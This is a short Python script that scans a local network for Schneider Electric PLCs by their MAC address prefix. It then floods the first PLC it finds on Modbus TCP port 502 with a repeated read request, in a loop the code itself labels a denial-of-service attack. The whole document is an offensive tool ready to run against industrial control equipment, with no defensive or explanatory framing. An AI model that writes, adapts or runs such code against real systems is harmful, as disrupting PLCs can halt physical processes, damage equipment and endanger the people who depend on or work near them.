import socket
import sys
from scapy.all import ARP, Ether, srp
import time

def find_plc_ip():
    # Define the IP range to scan (adjust according to your network)
    ip_range = "192.168.1.1/24"
    
    # Create an ARP request packet
    arp = ARP(pdst=ip_range)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether/arp

    # Send the packet and receive the response
    result = srp(packet, timeout=2, verbose=0)[0]

    # Parse the results
    devices = []
    for sent, received in result:
        devices.append({'ip': received.psrc, 'mac': received.hwsrc})

    # Check for Schneider Electric devices (based on MAC address prefix)
    for device in devices:
        if device['mac'].startswith('00:80:9F'):  # Schneider Electric MAC prefix
            print(f"PLC found at IP: {device['ip']}")
            return device['ip']
    
    print("PLC not found in the network.")
    return None

def perform_dos_attack(plc_ip, port=502):
    # Create a socket connection to the PLC
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(1)

    try:
        sock.connect((plc_ip, port))
        print(f"Connected to PLC at {plc_ip}:{port}")
    except socket.error as e:
        print(f"Failed to connect to PLC: {e}")
        return

    # Craft a Modbus TCP request (e.g., read holding registers)
    modbus_request = b'\x00\x01\x00\x00\x00\x06\x01\x03\x00\x00\x00\x01'

    # Send a large number of requests to the PLC
    print("Starting DoS attack...")
    try:
        while True:
            sock.send(modbus_request)
            time.sleep(0.01)  # Adjust the delay to control the rate of requests
    except KeyboardInterrupt:
        print("DoS attack stopped.")
    finally:
        sock.close()

if __name__ == "__main__":
    plc_ip = find_plc_ip()
    if plc_ip:
        perform_dos_attack(plc_ip)